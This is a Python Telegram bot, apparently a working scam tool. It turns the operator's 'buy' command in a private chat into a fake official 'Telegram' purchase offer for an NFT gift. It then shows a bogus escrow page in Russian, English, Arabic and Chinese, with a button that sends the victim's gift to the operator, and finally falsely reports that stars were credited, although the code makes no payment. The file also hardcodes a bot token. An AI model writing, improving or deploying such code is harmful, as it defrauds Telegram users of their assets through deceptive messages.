import asyncio
import logging
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"

# ID премиум-эмодзи
EMOJI_STAR = "5289728073040672852"
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"

STAR = f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
CHECK = f'<tg-emoji emoji-id="{EMOJI_CHECK}">✅</tg-emoji>'
CROSS = f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji>'

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

TEXTS = {
    "ru": {
        "title": "Сделка с NFT",
        "reserved": "Покупатель зарезервировал {amount} {star} средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
        "instruction": "<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {nft_name}\n2. Подтвердите передачу подарка.",
        "footer": "Платформа зафиксирует сделку и моментально зачислит {amount} {star} на ваш баланс. Резерв действует 24 часа.",
        "btn_give": "Передать подарок",
        "btn_confirm": "Подтвердить передачу",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "status_done": "Сделка успешно завершена! Средства зачислены.",
    },
    "en": {
        "title": "NFT Deal",
        "reserved": "Buyer has reserved {amount} {star} funds are protected and will be automatically credited to your balance immediately after the gift is transferred.",
        "instruction": "<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {nft_name}\n2. Confirm the gift transfer.",
        "footer": "The platform will record the deal and instantly credit {amount} {star} to your balance. The reserve is valid for 24 hours.",
        "btn_give": "Give Gift",
        "btn_confirm": "Confirm Transfer",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "status_done": "Deal successfully completed! Funds credited.",
    },
    "ar": {
        "title": "صفقة NFT",
        "reserved": "احتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم إضافتها تلقائيًا إلى رصيدك فور نقل الهدية.",
        "instruction": "<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {nft_name}\n2. أكد نقل الهدية.",
        "footer": "ستسجل المنصة الصفقة وتضيف {amount} {star} على الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "btn_give": "تقديم الهدية",
        "btn_confirm": "تأكيد النقل",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "status_done": "تمت الصفقة بنجاح! تم إضافة الأموال.",
    },
    "zh": {
        "title": "NFT 交易",
        "reserved": "买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。",
        "instruction": "<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {nft_name}\n2. 确认礼物转移。",
        "footer": "平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
        "btn_give": "赠送礼物",
        "btn_confirm": "确认转移",
        "btn_accept": "接受",
        "btn_decline": "拒绝",
        "status_done": "交易成功完成！资金已到账。",
    }
}

# --- ОБРАБОТЧИК КОМАНДЫ buy В БИЗНЕС-ЧАТЕ ---
# Срабатывает на сообщения, отправленные ВЛАДЕЛЬЦЕМ аккаунта
@dp.business_message(F.text.regexp(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$", flags=re.IGNORECASE))
async def handle_business_buy(message: types.Message):
    match = message.text.match(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$")
    
    if not match:
        return

    nft_link = match.group(1)
    amount = match.group(2)
    currency = match.group(3).lower()
    lang = match.group(4).lower()

    t = TEXTS.get(lang, TEXTS["ru"])
    nft_name = nft_link.split("/")[-1].replace("-", " #").replace("_", " ")

    # Получатель подарка - собеседник (тот, кому вы пишете в ЛС)
    recipient = message.chat.username or str(message.chat.id)

    # Редактируем ВАШЕ исходное сообщение (требуется разрешение "Edit messages" в настройках бота)
    offer_text = (
        f"<b>Telegram</b>\n"
        f"<b>{nft_name}</b>\n\n"
        f"Пользователь Предлагает Вам\n\n"
        f"{amount} {STAR} за подарок <a href='{nft_link}'>{nft_name}</a>.\n\n"
        f"Предложение действует еще 5 ч. 59 мин."
    )

    builder = InlineKeyboardBuilder()
    builder.button(text=f"{CHECK} {t['btn_accept']}", callback_data=f"accept|{nft_link}|{amount}|{lang}|{nft_name}|{recipient}")
    builder.button(text=f"{CROSS} {t['btn_decline']}", callback_data="decline")
    builder.adjust(2)

    try:
        # Редактируем сообщение владельца аккаунта
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=offer_text,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Ошибка редактирования: {e}")
        # Если не удалось отредактировать (нет прав), отправляем как новое
        await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )


# --- ЭТАП 2: ПРИНЯТЬ ---
@dp.callback_query(F.data.startswith("accept|"))
async def process_accept(callback: types.CallbackQuery):
    _, nft_link, amount, lang, nft_name, recipient = callback.data.split("|")
    t = TEXTS.get(lang, TEXTS["ru"])

    deal_text = (
        f"<b>{t['title']}</b>\n\n"
        f"Заказ #TG-67654174-0\n\n"
        f"{t['reserved'].format(amount=amount, star=STAR)}\n\n"
        f"{t['instruction'].format(nft_name=nft_name)}\n\n"
        f"{t['footer'].format(amount=amount, star=STAR)}"
    )

    # Ссылка на отправку подарка собеседнику
    gift_link = f"tg://send_gift?to={recipient}"

    builder = InlineKeyboardBuilder()
    builder.button(text=t['btn_give'], url=gift_link)
    builder.button(text=t['btn_confirm'], callback_data=f"confirm|{amount}|{lang}|{nft_name}")
    builder.adjust(1)

    try:
        # Редактируем сообщение на этап "Сделка"
        await callback.message.edit_text(deal_text, reply_markup=builder.as_markup(), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка редактирования на этапе 2: {e}")
        
    await callback.answer("Вы приняли предложение.")


# --- ЭТАП 3: ПОДТВЕРДИТЬ ---
@dp.callback_query(F.data.startswith("confirm|"))
async def process_confirm(callback: types.CallbackQuery):
    _, amount, lang, nft_name = callback.data.split("|")
    t = TEXTS.get(lang, TEXTS["ru"])

    final_text = (
        f"<b>{t['title']}</b>\n\n"
        f"{CHECK} {t['status_done']}\n\n"
        f"Вы передали подарок <b>{nft_name}</b>.\n"
        f"На ваш баланс зачислено <b>{amount} {STAR}</b>."
    )

    builder = InlineKeyboardBuilder()
    builder.button(text=f"{CHECK} Готово", callback_data="noop")
    builder.adjust(1)

    try:
        # Редактируем на финальный этап
        await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка редактирования на этапе 3: {e}")

    await callback.answer("Сделка завершена!")


# --- ОТКЛОНИТЬ ---
@dp.callback_query(F.data == "decline")
async def process_decline(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(f"{CROSS} Вы отклонили предложение.", parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка редактирования при отказе: {e}")
    await callback.answer("Предложение отклонено.")


@dp.callback_query(F.data == "noop")
async def process_noop(callback: types.CallbackQuery):
    await callback.answer("Сделка закрыта.")


async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
